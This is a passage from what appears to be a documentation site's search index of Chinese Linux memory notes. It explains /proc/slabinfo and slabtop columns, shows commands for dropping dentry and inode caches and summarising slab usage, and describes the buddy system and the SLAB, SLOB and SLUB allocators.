#\u6bcf\u884c\u4e2d\u7684slabdata\u6761\u76ee\u5305\u542b\u4ee5\u4e0b\u5b57\u6bb5\uff1a active_slabs \u6fc0\u6d3b\u7684 objperslab \u591a\u5c11\u4e2a nums_slabs \u5360\u7528\u7684 objperslab \u591a\u5c11\u4e2a sharedavail [\u5f85\u8bb0\u5f55] #\u884c\u9996\u7684 slabinfo - version: 2.1 #1.0 \u5728\u6574\u4e2a Linux 2.2.x \u5185\u6838\u7cfb\u5217\u4e2d\u90fd\u5b58\u5728\u3002 #1.1 \u51fa\u73b0\u5728 Linux 2.4.x \u5185\u6838\u7cfb\u5217\u4e2d\u3002 #1.2 Linux 2.5\u5f00\u53d1\u7cfb\u5217\u4e2d\u7b80\u8981\u4ecb\u7ecd\u7684\u4e00\u79cd\u683c\u5f0f\u3002 #2.0 \u5b58\u5728\u4e8e Linux 2.6.x \u5185\u6838\u4e2d\uff0c\u5305\u62ec Linux 2.6.9\u3002 #2.1 \u76ee\u524d\u7684\u683c\u5f0f\uff0c\u6700\u65e9\u51fa\u73b0\u5728Linux 2.6.10","title":"/proc/slabinfo\u5404\u4e2a\u5217\u7684\u610f\u601d\u89e3\u91ca"},{"location":"system/linux/%E5%86%85%E5%AD%98/0proc0slabinfo/#slabtop","text":"[root@VM-0-16-centos ~]# slabtop Active / Total Objects (% used) : 210181 / 216239 (97.2%) Active / Total Slabs (% used) : 7921 / 7921 (100.0%) Active / Total Caches (% used) : 74 / 105 (70.5%) Active / Total Size (% used) : 69560.35K / 71380.84K (97.4%) Minimum / Average / Maximum Object : 0.01K / 0.33K / 8.00K OBJS ACTIVE USE OBJ SIZE SLABS OBJ/SLAB CACHE SIZE NAME 49728 49728 100% 0.19K 2368 21 9472K dentry 28 25 89% 8.00K 7 4 224K kmalloc-8192 OBJS \u2014 The total number of objects (memory blocks), including those in use (allocated), and some spares not in use. \u5bf9\u8c61\u7684\u603b\u6570 ACTIVE \u2014 The number of objects (memory blocks) that are in use (allocated). \u6b63\u5728\u4f7f\u7528\u7684\u5bf9\u8c61\u6570\u3002 USE \u2014 Percentage of total objects that are active. \u6d3b\u52a8\u5bf9\u8c61\u603b\u6570\u7684\u767e\u5206\u6bd4 \u3002((ACTIVE/OBJS)(100)) OBJ SIZE \u2014 The size of the objects. \u5bf9\u8c61\u7684\u5927\u5c0f\u3002\uff08\u5bf9\u5e94/proc/slabinfo\u4e2d <objsize> \uff09 SLABS \u2014 The total number of slabs. slabs\u7684\u4e2a\u6570\u3002\uff08slab\u7684\u4e2a\u6570\uff0c\u5bf9\u5e94/proc/slabinfo\u4e2d\u7684nums_slabs\uff09 OBJ/SLAB \u2014 The number of objects that fit into a slab. slab\u4e2d\u7684\u5bf9\u8c61\u6570\u3002\uff08\u4e00\u4e2aslab\u4e2d\u591a\u5c11\u4e2a\u5bf9\u8c61\uff09 CACHE SIZE \u2014 The cache size of the slab. \u5bf9\u8c61\u7f13\u5b58\u5927\u5c0f(\u6211\u53d1\u73b0\u8fd9\u4e2a\u503c\u5927\u5c0f\u6b63\u597d\u7b49\u4e8eOBJS\u4e58\u4ee5OBJ SIZE\uff0c\u5728/proc/slabinfo\u4e2d\uff0c <num_objs> \u4e58\u4ee5 <objsize> ) NAME \u2014 The name of the slab. slab\u7684\u540d\u79f0","title":"\u89e3\u91caslabtop\u547d\u4ee4"},{"location":"system/linux/%E5%86%85%E5%AD%98/0proc0slabinfo/#dentryinode","text":"echo 3 > /proc/sys/vm/drop_caches $ cat /proc/slabinfo | grep -v \"^#\"|awk '$3!=0{print $1,$2,$3,$4}' | sort -k3nr | head -n 10 | awk '{print $1,$2,$3,(($2/$3)*100)\"%\",$4*$3/1024\"K\"}' # slab\u540d\u5b57 \u6b63\u5728\u4f7f\u7528\u7684\u5bf9\u8c61\u4e2a\u6570 \u603b\u7684\u5bf9\u8c61\u4e2a\u6570 \u6b63\u5728\u4f7f\u7528\u7684\u5bf9\u8c61\u767e\u5206\u6bd4 cache\u5927\u5c0f dentry 49959 49959 100% 9367.31K ext4_inode_cache 36096 36096 100% 36096K buffer_head 26871 26871 100% 2729.09K kernfs_node_cache 17884 17952 99.6212% 2103.75K selinux_inode_security 9465 10506 90.0914% 410.391K kmalloc-64 9786 10304 94.9728% 644K inode_cache 9882 9882 100% 5713.03K ext4_extent_status 8262 8262 100% 322.734K kmalloc-8 5120 5120 100% 40K kmalloc-16 4718 4864 96.9984% 76K $ echo 3 > /proc/sys/vm/drop_caches $ cat /proc/slabinfo | grep -v \"^#\"|awk '$3!=0{print $1,$2,$3,$4}' | sort -k3nr | head -n 10 | awk '{print $1,$2,$3,(($2/$3)*100)\"%\",$4*$3/1024\"K\"}' buffer_head 5426 18837 28.805% 1913.13K kernfs_node_cache 17884 17952 99.6212% 2103.75K dentry 9278 14826 62.5793% 2779.88K selinux_inode_security 9465 10506 90.0914% 410.391K kmalloc-64 9311 10240 90.9277% 640K inode_cache 7608 8424 90.3134% 4870.12K kmalloc-8 5120 5120 100% 40K kmalloc-16 4718 4864 96.9984% 76K vm_area_struct 4075 4122 98.8598% 869.484K shared_policy_node 3656 3995 91.5144% 187.266K \u8d44\u6599\uff1a https://man7.org/linux/man-pages/man5/slabinfo.5.html https://man7.org/linux/man-pages/man1/slabtop.1.htm https://www.kernel.org/doc/man-pages/","title":"\u91ca\u653edentry\u548cinode\u5bf9\u8c61"},{"location":"system/linux/%E5%86%85%E5%AD%98/Linux%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E6%96%B9%E5%BC%8F/","text":"Linux\u7684\u4e24\u79cd\u5185\u5b58\u5206\u914d\u65b9\u5f0f \u4f19\u4f34\u7cfb\u7edf \u4f19\u4f34\u7cfb\u7edf\u4ee5\u9875\u8fdb\u884c\u5206\u914d\uff0c\u91c7\u7528 2 \u7684\u5e42\u5206\u914d\u5668\u6765\u6ee1\u8db3\u8bf7\u6c42\u5206\u914d\u5355\u5143\u7684\u5927\u5c0f\u4e3a 2 \u7684\u5e42\uff084KB\uff08\u4e00\u4e2a\u9875\uff09\u3001 8KB\uff08\u4e24\u4e2a\u9875\uff09\u300116KB\uff08\u56db\u4e2a\u9875\uff09\u7b49\uff09\u3002\u8bf7\u6c42\u5355\u5143\u7684\u5927\u5c0f\u5982\u4e0d\u9002\u5f53\uff0c\u5c31\u5706\u6574\u5230\u4e0b\u4e00\u4e2a\u66f4\u5927\u7684 2 \u7684\u5e42\u3002\u4f8b\u5982\uff0c\u5982\u679c\u8bf7\u6c42\u5927\u5c0f\u4e3a 11KB\uff0c\u5219\u6309 16KB \u7684\u6bb5\u6765\u8bf7\u6c42\u3002 \u8ba9\u6211\u4eec\u8003\u8651\u4e00\u4e2a\u7b80\u5355\u4f8b\u5b50\u3002\u5047\u8bbe\u5185\u5b58\u6bb5\u7684\u5927\u5c0f\u6700\u521d\u4e3a 256KB\uff0c\u5185\u6838\u8bf7\u6c42 21KB \u7684\u5185\u5b58\u3002\u6700\u521d\uff0c\u8fd9\u4e2a\u6bb5\u5206\u4e3a\u4e24\u4e2a\u4f19\u4f34\uff0c\u79f0\u4e3a AL \u548c AR\uff0c\u6bcf\u4e2a\u7684\u5927\u5c0f\u90fd\u4e3a 128KB\uff1b\u8fd9\u4e24\u4e2a\u4f19\u4f34\u4e4b\u4e00\u8fdb\u4e00\u6b65\u5206\u6210\u4e24\u4e2a 64KB \u7684\u4f19\u4f34\uff0c\u5373 BL \u548c BR\u3002\u7136\u800c\uff0c\u4ece 21KB \u5f00\u59cb\u7684\u4e0b\u4e00\u4e2a\u5927\u7684 2 \u7684\u5e42\u662f 32KB\uff0c\u56e0\u6b64 BL \u6216 BR \u518d\u6b21\u5212\u5206\u4e3a\u4e24\u4e2a 32KB \u7684\u4f19\u4f34 CL \u548c CR\u3002\u56e0\u6b64\uff0c\u5176\u4e2d\u4e00\u4e2a 32KB \u7684\u6bb5\u53ef\u7528\u4e8e\u6ee1\u8db3 21KB \u8bf7\u6c42\u3002\u8fd9\u79cd\u65b9\u6848\u5982\u56fe 1 \u6240\u793a\uff0c\u5176\u4e2d CL \u6bb5\u662f\u5206\u914d\u7ed9 21KB \u8bf7\u6c42\u7684\u3002 \u4f19\u4f34\u7cfb\u7edf\u7684\u4e00\u4e2a\u4f18\u70b9\u662f\uff1a\u901a\u8fc7\u79f0\u4e3a\u5408\u5e76\u7684\u6280\u672f\uff0c\u53ef\u4ee5\u5c06\u76f8\u90bb\u4f19\u4f34\u5feb\u901f\u7ec4\u5408\u4ee5\u5f62\u6210\u66f4\u5927\u5206\u6bb5\u3002\u4f8b\u5982\uff0c\u5728\u56fe 1 \u4e2d\uff0c\u5f53\u5185\u6838\u91ca\u653e\u5df2\u88ab\u5206\u914d\u7684 CL \u65f6\uff0c\u7cfb\u7edf\u53ef\u4ee5\u5c06 CL \u548c CR \u5408\u5e76\u6210 64KB \u7684\u6bb5\u3002\u6bb5 BL \u7ee7\u800c\u53ef\u4ee5\u4e0e\u4f19\u4f34 BR \u5408\u5e76\uff0c\u4ee5\u5f62\u6210 128KB \u6bb5\u3002\u6700\u7ec8\uff0c\u53ef\u4ee5\u5f97\u5230\u539f\u6765\u7684 256KB \u6bb5\u3002 \u4f19\u4f34\u7cfb\u7edf\u7684\u660e\u663e\u7f3a\u70b9\u662f\uff1a\u7531\u4e8e\u5f53\u524d\u5230\u4e0b\u4e00\u4e2a 2 \u7684\u5e42\uff0c\u5f88\u53ef\u80fd\u9020\u6210\u5206\u914d\u6bb5\u5185\u7684\u788e\u7247\u3002\u4f8b\u5982\uff0c33KB \u7684\u5185\u5b58\u8bf7\u6c42\u53ea\u80fd\u4f7f\u7528 64KB \u6bb5\u6765\u6ee1\u8db3\u3002\u4e8b\u5b9e\u4e0a\uff0c\u6211\u4eec\u4e0d\u80fd\u4fdd\u8bc1\u56e0\u5185\u90e8\u788e\u7247\u800c\u6d6a\u8d39\u7684\u5355\u5143\u4e00\u5b9a\u5c11\u4e8e 50%\u3002 slab\u5206\u914d \u5206\u914d\u5185\u6838\u5185\u5b58\u7684\u7b2c\u4e8c\u79cd\u7b56\u7565\u79f0\u4e3aslab\u5206\u914d\u3002\u6bcf\u4e2a slab \u7531\u4e00\u4e2a\u6216\u591a\u4e2a\u7269\u7406\u8fde\u7eed\u7684\u9875\u9762\u7ec4\u6210\uff0c\u6bcf\u4e2a cache \u7531\u4e00\u4e2a\u6216\u591a\u4e2a slab \u7ec4\u6210\uff0c\u6bcf\u4e2a\u5185\u6838\u6570\u636e\u7ed3\u6784\u90fd\u6709\u4e00\u4e2a cache\u3002 \u4f8b\u5982\uff0c\u7528\u4e8e\u8868\u793a\u8fdb\u7a0b\u63cf\u8ff0\u7b26\u3001\u6587\u4ef6\u5bf9\u8c61\u3001\u4fe1\u53f7\u91cf\u7b49\u7684\u6570\u636e\u7ed3\u6784\u90fd\u6709\u5404\u81ea\u5355\u72ec\u7684 cache\u3002\u6bcf\u4e2a cache \u542b\u6709\u5185\u6838\u6570\u636e\u7ed3\u6784\u7684\u5bf9\u8c61\u5b9e\u4f8b\uff08\u79f0\u4e3a object\uff09\u3002\u4f8b\u5982\uff0c\u4fe1\u53f7\u91cf cache \u6709\u4fe1\u53f7\u91cf\u5bf9\u8c61\uff0c\u8fdb\u7a0b\u63cf\u8ff0\u7b26 cache \u6709\u8fdb\u7a0b\u63cf\u8ff0\u7b26\u5bf9\u8c61\uff0c\u7b49\u7b49\u3002 \u4e0a\u56fe\u663e\u793a\u4e86 slab\u3001cache \u53ca object \u4e09\u8005\u4e4b\u95f4\u7684\u5173\u7cfb\u3002\u8be5\u56fe\u663e\u793a\u4e86 2 \u4e2a\u5927\u5c0f\u4e3a 3KB \u7684\u5185\u6838\u5bf9\u8c61\u548c 3 \u4e2a\u5927\u5c0f\u4e3a 7KB \u7684\u5bf9\u8c61\uff0c\u5b83\u4eec\u4f4d\u4e8e\u5404\u81ea\u7684 cache \u4e2d\u3002 slab \u5206\u914d\u7b97\u6cd5\u91c7\u7528 cache \u6765\u5b58\u50a8\u5185\u6838\u5bf9\u8c61\u3002\u5728\u521b\u5efa cache \u65f6\uff0c\u82e5\u5e72\u8d77\u521d\u6807\u8bb0\u4e3a free \u7684\u5bf9\u8c61\u88ab\u5206\u914d\u5230 cache\u3002cache \u5185\u7684\u5bf9\u8c61\u6570\u91cf\u53d6\u51b3\u4e8e\u76f8\u5173 slab \u7684\u5927\u5c0f\u3002\u4f8b\u5982\uff0c12KB slab\uff08\u7531 3 \u4e2a\u8fde\u7eed\u7684 4KB \u9875\u9762\u7ec4\u6210\uff09\u53ef\u4ee5\u5b58\u50a8 6 \u4e2a 2KB \u5bf9\u8c61\u3002\u6700\u521d\uff0ccache \u5185\u7684\u6240\u6709\u5bf9\u8c61\u90fd\u6807\u8bb0\u4e3a\u7a7a\u95f2\u3002\u5f53\u9700\u8981\u5185\u6838\u6570\u636e\u7ed3\u6784\u7684\u65b0\u5bf9\u8c61\u65f6\uff0c\u5206\u914d\u5668\u53ef\u4ee5\u4ece cache \u4e0a\u5206\u914d\u4efb\u4f55\u7a7a\u95f2\u5bf9\u8c61\u4ee5\u4fbf\u6ee1\u8db3\u8bf7\u6c42\u3002\u4ece cache \u4e0a\u5206\u914d\u7684\u5bf9\u8c61\u6807\u8bb0\u4e3a used\uff08\u4f7f\u7528\uff09\u3002 \u8ba9\u6211\u4eec\u8003\u8651\u4e00\u4e2a\u573a\u666f\uff0c\u8fd9\u91cc\u5185\u6838\u4e3a\u8868\u793a\u8fdb\u7a0b\u63cf\u8ff0\u7b26\u7684\u5bf9\u8c61\u4ece slab \u5206\u914d\u5668\u8bf7\u6c42\u5185\u5b58\u3002\u5728 Linux \u7cfb\u7edf\u4e2d\uff0c\u8fdb\u7a0b\u63cf\u8ff0\u7b26\u5c5e\u4e8e struct task_struct \u7c7b\u578b\uff0c\u5b83\u9700\u8981\u5927\u7ea6 1.7KB \u7684\u5185\u5b58\u3002\u5f53 Linux \u5185\u6838\u521b\u5efa\u4e00\u4e2a\u65b0\u4efb\u52a1\u65f6\uff0c\u5b83\u4ece cache \u4e2d\u8bf7\u6c42 struct task_struct \u5bf9\u8c61\u7684\u5fc5\u8981\u5185\u5b58\u3002cache \u5229\u7528\u5df2\u7ecf\u5728 slab \u4e2d\u5206\u914d\u7684\u5e76\u4e14\u6807\u8bb0\u4e3a free (\u7a7a\u95f2\uff09\u7684 struct task_struct \u5bf9\u8c61\u6765\u6ee1\u8db3\u8bf7\u6c42\u3002 \u5728 Linux \u4e2d\uff0cslab \u53ef\u4ee5\u5904\u4e8e\u4e09\u79cd\u53ef\u80fd\u72b6\u6001\u4e4b\u4e00\uff1a \u6ee1\u7684\uff1aslab \u7684\u6240\u6709\u5bf9\u8c61\u6807\u8bb0\u4e3a\u4f7f\u7528\u3002 \u7a7a\u7684\uff1aslab \u4e0a\u7684\u6240\u6709\u5bf9\u8c61\u6807\u8bb0\u4e3a\u7a7a\u95f2\u3002 \u90e8\u5206\uff1aslab \u4e0a\u7684\u5bf9\u8c61\u6709\u7684\u6807\u8bb0\u4e3a\u4f7f\u7528\uff0c\u6709\u7684\u6807\u8bb0\u4e3a\u7a7a\u95f2\u3002 slab \u5206\u914d\u5668\u9996\u5148\u5c1d\u8bd5\u5728\u90e8\u5206\u4e3a\u7a7a\u7684 slab \u4e2d\u7528\u7a7a\u95f2\u5bf9\u8c61\u6765\u6ee1\u8db3\u8bf7\u6c42\u3002\u5982\u679c\u4e0d\u5b58\u5728\uff0c\u5219\u4ece\u7a7a\u7684 slab \u4e2d\u5206\u914d\u7a7a\u95f2\u5bf9\u8c61\u3002\u5982\u679c\u6ca1\u6709\u7a7a\u7684 slab \u53ef\u7528\uff0c\u5219\u4ece\u8fde\u7eed\u7269\u7406\u9875\u9762\u5206\u914d\u65b0\u7684 slab\uff0c\u5e76\u5c06\u5176\u5206\u914d\u7ed9 cache\uff1b\u4ece\u8fd9\u4e2a slab \u4e0a\uff0c\u518d\u5206\u914d\u5bf9\u8c61\u5185\u5b58\u3002 slab \u5206\u914d\u5668\u63d0\u4f9b\u4e24\u4e2a\u4e3b\u8981\u4f18\u70b9\uff1a \u6ca1\u6709\u56e0\u788e\u7247\u800c\u5f15\u8d77\u5185\u5b58\u6d6a\u8d39\u3002\u788e\u7247\u4e0d\u662f\u95ee\u9898\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u5185\u6838\u6570\u636e\u7ed3\u6784\u90fd\u6709\u5173\u8054\u7684 cache\uff0c\u6bcf\u4e2a cache \u90fd\u7531\u4e00\u4e2a\u6216\u591a\u4e2a slab \u7ec4\u6210\uff0c\u800c slab \u6309\u6240\u8868\u793a\u5bf9\u8c61\u7684\u5927\u5c0f\u6765\u5206\u5757\u3002\u56e0\u6b64\uff0c\u5f53\u5185\u6838\u8bf7\u6c42\u5bf9\u8c61\u5185\u5b58\u65f6\uff0cslab \u5206\u914d\u5668\u53ef\u4ee5\u8fd4\u56de\u521a\u597d\u8868\u793a\u5bf9\u8c61\u7684\u6240\u9700\u5185\u5b58\u3002 \u53ef\u4ee5\u5feb\u901f\u6ee1\u8db3\u5185\u5b58\u8bf7\u6c42\u3002\u56e0\u6b64\uff0c\u5f53\u5bf9\u8c61\u9891\u7e41\u5730\u88ab\u5206\u914d\u548c\u91ca\u653e\u65f6\uff0c\u5982\u6765\u81ea\u5185\u6838\u8bf7\u6c42\u7684\u60c5\u51b5\uff0cslab \u5206\u914d\u65b9\u6848\u5728\u7ba1\u7406\u5185\u5b58\u65f6\u7279\u522b\u6709\u6548\u3002\u5206\u914d\u548c\u91ca\u653e\u5185\u5b58\u7684\u52a8\u4f5c\u53ef\u80fd\u662f\u4e00\u4e2a\u8017\u65f6\u8fc7\u7a0b\u3002\u7136\u800c\uff0c\u7531\u4e8e\u5bf9\u8c61\u5df2\u9884\u5148\u521b\u5efa\uff0c\u56e0\u6b64\u53ef\u4ee5\u4ece cache \u4e2d\u5feb\u901f\u5206\u914d\u3002\u518d\u8005\uff0c\u5f53\u5185\u6838\u7528\u5b8c\u5bf9\u8c61\u5e76\u91ca\u653e\u5b83\u65f6\uff0c\u5b83\u88ab\u6807\u8bb0\u4e3a\u7a7a\u95f2\u5e76\u8fd4\u56de\u5230 cache\uff0c\u4ece\u800c\u7acb\u5373\u53ef\u7528\u4e8e\u540e\u7eed\u7684\u5185\u6838\u8bf7\u6c42\u3002 slab \u5206\u914d\u5668\u9996\u5148\u51fa\u73b0\u5728 Solaris 2.4 \u5185\u6838\u4e2d\u3002\u7531\u4e8e\u901a\u7528\u6027\u8d28\uff0cSolaris \u73b0\u5728\u4e5f\u5c06\u8fd9\u79cd\u5206\u914d\u5668\u7528\u4e8e\u67d0\u4e9b\u7528\u6237\u6a21\u5f0f\u7684\u5185\u5b58\u8bf7\u6c42\u3002\u6700\u521d\uff0cLinux \u4f7f\u7528\u7684\u662f\u4f19\u4f34\u7cfb\u7edf\uff1b\u7136\u800c\uff0c\u4ece\u7248\u672c 2.2 \u5f00\u59cb\uff0cLinux \u5185\u6838\u91c7\u7528 slab \u5206\u914d\u5668\u3002 \u73b0\u5728\uff0c\u6700\u8fd1\u53d1\u5e03\u7684 Linux \u4e5f\u5305\u62ec\u53e6\u5916\u4e24\u4e2a\u5185\u6838\u5185\u5b58\u5206\u914d\u5668\uff0cSLOB \u548c SLUB \u5206\u914d\u5668\uff08Linux \u5c06 slab \u5b9e\u73b0\u79f0\u4e3a SLAB\uff09\u3002 \u7b80\u5355\u5757\u5217\u8868\uff08SLOB\uff09\u5206\u914d\u5668\u7528\u4e8e\u6709\u9650\u5185\u5b58\u7684\u7cfb\u7edf\uff0c\u4f8b\u5982\u5d4c\u5165\u5f0f\u7cfb\u7edf\u3002SLOB \u5de5\u4f5c\u91c7\u7528 3 \u4e2a\u5bf9\u8c61\u5217\u8868\uff1a\u5c0f\uff08\u7528\u4e8e\u5c0f\u4e8e 256 \u5b57\u8282\u7684\u5bf9\u8c61\uff09\u3001\u4e2d\uff08\u7528\u4e8e\u5c0f\u4e8e 1024 \u5b57\u8282\u7684\u5bf9\u8c61\uff09\u548c\u5927\uff08\u7528\u4e8e\u5c0f\u4e8e\u9875\u9762\u5927\u5c0f\u7684\u5bf9\u8c61\uff09\u3002\u5185\u5b58\u8bf7\u6c42\u91c7\u7528\u9996\u5148\u9002\u5e94\u7b56\u7565\uff0c\u4ece\u9002\u5f53\u5927\u5c0f\u7684\u5217\u8868\u4e0a\u5206\u914d\u5bf9\u8c61\u3002 \u4ece\u7248\u672c 2.6.24 \u5f00\u59cb\uff0cSLUB \u5206\u914d\u5668\u53d6\u4ee3 SLAB\uff0c\u6210\u4e3a Linux \u5185\u6838\u7684\u9ed8\u8ba4\u5206\u914d\u5668\u3002SLUB \u901a\u8fc7\u51cf\u5c11 SLAB \u5206\u914d\u5668\u6240\u9700\u7684\u5927\u91cf\u5f00\u9500\uff0c\u6765\u89e3\u51b3 slab \u5206\u914d\u7684\u6027\u80fd\u95ee\u9898\uff0c\u4e00\u4e2a\u6539\u53d8\u662f\uff0c\u5728 SLAB \u5206\u914d\u4e0b\u6bcf\u4e2a slab \u5b58\u50a8\u7684\u5143\u6570\u636e\uff0c\u79fb\u5230 Linux \u5185\u6838\u7528\u4e8e\u6bcf\u4e2a\u9875\u9762\u7684\u7ed3\u6784 page\u3002\u6b64\u5916\uff0c\u5bf9\u4e8e SLAB \u5206\u914d\u5668\uff0c\u6bcf\u4e2a CPU \u90fd\u6709\u961f\u5217\u4ee5\u7ef4\u62a4\u6bcf\u4e2a cache \u5185\u7684\u5bf9\u8c61\uff0cSLUB \u4f1a\u5220\u9664\u8fd9\u4e9b\u961f\u5217\u3002 \u5bf9\u4e8e\u5177\u6709\u5927\u91cf\u5904\u7406\u5668\u7684\u7cfb\u7edf\uff0c\u5206\u914d\u7ed9\u8fd9\u4e9b\u961f\u5217\u7684\u5185\u5b58\u91cf\u662f\u5f88\u91cd\u8981\u7684\u3002\u56e0\u6b64\uff0c\u968f\u7740\u7cfb\u7edf\u5904\u7406\u5668\u6570\u91cf\u7684\u589e\u52a0\uff0cSLUB \u6027\u80fd\u4e5f\u66f4\u597d\u3002","title":"Linux\u7684\u4e24\u79cd\u5185\u5b58\u5206\u914d\u65b9\u5f0f"},{"location":"system/linux/%E5%86%85%E5%AD%98/Linux%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E6%96%B9%E5%BC%8F/#linux","text":"","title":"Linux\u7684\u4e24\u79cd\u5185\u5b58\u5206\u914d\u65b9\u5f0f"},{"location":"system/linux/%E5%86%85%E5%AD%98/Linux%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E6%96%B9%E5%BC%8F/#_1","text":"\u4f19\u4f34\u7cfb\u7edf\u4ee5\u9875\u8fdb\u884c\u5206\u914d\uff0c\u91c7\u7528 2 \u7684\u5e42\u5206\u914d\u5668\u6765\u6ee1\u8db3\u8bf7\u6c42\u5206\u914d\u5355\u5143\u7684\u5927\u5c0f\u4e3a 2 \u7684\u5e42\uff084KB\uff08\u4e00\u4e2a\u9875\uff09\u3001 8KB\uff08\u4e24\u4e2a\u9875\uff09\u300116KB\uff08\u56db\u4e2a\u9875\uff09\u7b49\uff09\u3002\u8bf7\u6c42\u5355\u5143\u7684\u5927\u5c0f\u5982\u4e0d\u9002\u5f53\uff0c\u5c31\u5706\u6574\u5230\u4e0b\u4e00\u4e2a\u66f4\u5927\u7684 2 \u7684\u5e42\u3002\u4f8b\u5982\uff0c\u5982\u679c\u8bf7\u6c42\u5927\u5c0f\u4e3a 11KB\uff0c\u5219\u6309 16KB \u7684\u6bb5\u6765\u8bf7\u6c42\u3002 \u8ba9\u6211\u4eec\u8003\u8651\u4e00\u4e2a\u7b80\u5355\u4f8b\u5b50\u3002\u5047\u8bbe\u5185\u5b58\u6bb5\u7684\u5927\u5c0f\u6700\u521d\u4e3a 256KB\uff0c\u5185\u6838\u8bf7\u6c42 21KB \u7684\u5185\u5b58\u3002\u6700\u521d\uff0c\u8fd9\u4e2a\u6bb5\u5206\u4e3a\u4e24\u4e2a\u4f19\u4f34\uff0c\u79f0\u4e3a AL \u548c AR\uff0c\u6bcf\u4e2a\u7684\u5927\u5c0f\u90fd\u4e3a 128KB\uff1b\u8fd9\u4e24\u4e2a\u4f19\u4f34\u4e4b\u4e00\u8fdb\u4e00\u6b65\u5206\u6210\u4e24\u4e2a 64KB \u7684\u4f19\u4f34\uff0c\u5373 BL \u548c BR\u3002\u7136\u800c\uff0c\u4ece 21KB \u5f00\u59cb\u7684\u4e0b\u4e00\u4e2a\u5927\u7684 2 \u7684\u5e42\u662f 32KB\uff0c\u56e0\u6b64 BL \u6216 BR \u518d\u6b21\u5212\u5206\u4e3a\u4e24\u4e2a 32KB \u7684\u4f19\u4f34 CL \u548c CR\u3002\u56e0\u6b64\uff0c\u5176\u4e2d\u4e00\u4e2a 32KB \u7684\u6bb5\u53ef\u7528\u4e8e\u6ee1\u8db3 21KB \u8bf7\u6c42\u3002\u8fd9\u79cd\u65b9\u6848\u5982\u56fe 1 \u6240\u793a\uff0c\u5176\u4e2d CL \u6bb5\u662f\u5206\u914d\u7ed9 21KB \u8bf7\u6c42\u7684\u3002 \u4f19\u4f34\u7cfb\u7edf\u7684\u4e00\u4e2a\u4f18\u70b9\u662f\uff1a\u901a\u8fc7\u79f0\u4e3a\u5408\u5e76\u7684\u6280\u672f\uff0c\u53ef\u4ee5\u5c06\u76f8\u90bb\u4f19\u4f34\u5feb\u901f\u7ec4\u5408\u4ee5\u5f62\u6210\u66f4\u5927\u5206\u6bb5\u3002\u4f8b\u5982\uff0c\u5728\u56fe 1 \u4e2d\uff0c\u5f53\u5185\u6838\u91ca\u653e\u5df2\u88ab\u5206\u914d\u7684 CL \u65f6\uff0c\u7cfb\u7edf\u53ef\u4ee5\u5c06 CL \u548c CR \u5408\u5e76\u6210 64KB \u7684\u6bb5\u3002\u6bb5 BL \u7ee7\u800c\u53ef\u4ee5\u4e0e\u4f19\u4f34 BR \u5408\u5e76\uff0c\u4ee5\u5f62\u6210 128KB \u6bb5\u3002\u6700\u7ec8\uff0c\u53ef\u4ee5\u5f97\u5230\u539f\u6765\u7684 256KB \u6bb5\u3002 \u4f19\u4f34\u7cfb\u7edf\u7684\u660e\u663e\u7f3a\u70b9\u662f\uff1a\u7531\u4e8e\u5f53\u524d\u5230\u4e0b\u4e00\u4e2a 2 \u7684\u5e42\uff0c\u5f88\u53ef\u80fd\u9020\u6210\u5206\u914d\u6bb5\u5185\u7684\u788e\u7247\u3002\u4f8b\u5982\uff0c33KB \u7684\u5185\u5b58\u8bf7\u6c42\u53ea\u80fd\u4f7f\u7528 64KB \u6bb5\u6765\u6ee1\u8db3\u3002\u4e8b\u5b9e\u4e0a\uff0c\u6211\u4eec\u4e0d\u80fd\u4fdd\u8bc1\u56e0\u5185\u90e8\u788e\u7247\u800c\u6d6a\u8d39\u7684\u5355\u5143\u4e00\u5b9a\u5c11\u4e8e 50%\u3002","title":"\u4f19\u4f34\u7cfb\u7edf"},{"location":"system/linux/%E5%86%85%E5%AD%98/Linux%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E6%96%B9%E5%BC%8F/#slab","text":"\u5206\u914d\u5185\u6838\u5185\u5b58\u7684\u7b2c\u4e8c\u79cd\u7b56\u7565\u79f0\u4e3aslab\u5206\u914d\u3002\u6bcf\u4e2a slab \u7531\u4e00\u4e2a\u6216\u591a\u4e2a\u7269\u7406\u8fde\u7eed\u7684\u9875\u9762\u7ec4\u6210\uff0c\u6bcf\u4e2a cache \u7531\u4e00\u4e2a\u6216\u591a\u4e2a slab \u7ec4\u6210\uff0c\u6bcf\u4e2a\u5185\u6838\u6570\u636e\u7ed3\u6784\u90fd\u6709\u4e00\u4e2a cache\u3002 \u4f8b\u5982\uff0c\u7528\u4e8e\u8868\u793a\u8fdb\u7a0b\u63cf\u8ff0\u7b26\u3001\u6587\u4ef6\u5bf9\u8c61\u3001\u4fe1\u53f7\u91cf\u7b49\u7684\u6570\u636e\u7ed3\u6784\u90fd\u6709\u5404\u81ea\u5355\u72ec\u7684 cache\u3002\u6bcf\u4e2a cache \u542b\u6709\u5185\u6838\u6570\u636e\u7ed3\u6784\u7684\u5bf9\u8c61\u5b9e\u4f8b\uff08\u79f0\u4e3a object\uff09\u3002\u4f8b\u5982\uff0c\u4fe1\u53f7\u91cf cache \u6709\u4fe1\u53f7\u91cf\u5bf9\u8c61\uff0c\u8fdb\u7a0b\u63cf\u8ff0\u7b26 cache \u6709\u8fdb\u7a0b\u63cf\u8ff0\u7b26\u5bf9\u8c61\uff0c\u7b49\u7b49\u3002 \u4e0a\u56fe\u663e\u793a\u4e86 slab\u3001cache \u53ca object \u4e09\u8005\u4e4b\u95f4\u7684\u5173\u7cfb\u3002\u8be5\u56fe\u663e\u793a\u4e86 2 \u4e2a\u5927\u5c0f\u4e3a 3KB \u7684\u5185\u6838\u5bf9\u8c61\u548c 3 \u4e2a\u5927\u5c0f\u4e3a 7KB \u7684\u5bf9\u8c61\uff0c\u5b83\u4eec\u4f4d\u4e8e\u5404\u81ea\u7684 cache \u4e2d\u3002 slab \u5206\u914d\u7b97\u6cd5\u91c7\u7528 cache \u6765\u5b58\u50a8\u5185\u6838\u5bf9\u8c61\u3002\u5728\u521b\u5efa cache \u65f6\uff0c\u82e5\u5e72\u8d77\u521d\u6807\u8bb0\u4e3a free \u7684\u5bf9\u8c61\u88ab\u5206\u914d\u5230 cache\u3002cache 